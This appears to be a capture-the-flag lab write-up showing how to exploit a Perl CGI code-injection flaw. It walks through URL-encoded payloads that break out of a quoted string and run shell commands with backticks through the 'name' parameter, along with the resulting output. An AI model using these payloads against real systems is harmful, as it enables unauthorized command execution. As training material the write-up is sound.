Code Execution 09

This challenge is code injection in Perl. The Perl script is deployed as a CGI script. You can quickly get a better understanding of how the site works by inspecting the traffic. First the index page is loaded, then it does a request to the CGI in JavaScript.

As always, you can use single or double quotes to trigger unexpected behaviour in the application. 
Once you find which one is used, you should be able to gain command execution using backticks or one of the Perl functions used to run command (system, exec...). 
Once you are able to run commands like uname, you should be able to score this exercise.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-6b91d746-a546a206.libcurl.so/. 
You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-6b91d746-a546a206.libcurl.so/.

Steps:
 1) Visit the given url: http://ptc-6b91d746-a546a206.libcurl.so/. 
 2) We can see [In this exercise, the goal is to find the Code Execution. You should start here.] We can click 'here' and observe the parameter change.
 3) Go to developer tools or simple (ctrl+shift+i) And go to the network.
    Perform a request or reload the page to see detailed information about network activity.
    We can see hello?name=hacker in the file column. Simply click on it and we also can see: https://ptl-89f32f45-d7881c8c.libcurl.so/cgi-bin/hello?name=hacker2

 4) Here we simply injected '.''.' and satisfied the condition. Dot (.) is concatenation used in perl so we used 'uname' and replaced inside double quotes.
      Seems as: 
            https://ptl-89f32f45-d7881c8c.libcurl.so/cgi-bin/hello?name=hacker2%27.%27%27.%27
         i.e. %27 = ' 
 5) Let's payload code named `uname` looked like below: 
      https://ptl-89f32f45-d7881c8c.libcurl.so/cgi-bin/hello?name=hacker2%27.`uname%20-a`.%27
      We'll see" SyntaxError: JSON.parse: bad control character in string literal at line 1 column 108 of the JSON data
      But slightly see in raw data you can see the uname response as: 
         "Hello hacker2Linux 3bb3c731a8d1 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
6)  Again replace the payload `uname` with `/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8` and nothing next same procedure as above line:
      Let's see in RAW DATA.
7) Bravo!! "Hello hacker2Exercise completed!! 

      Happy Hacking!! :) 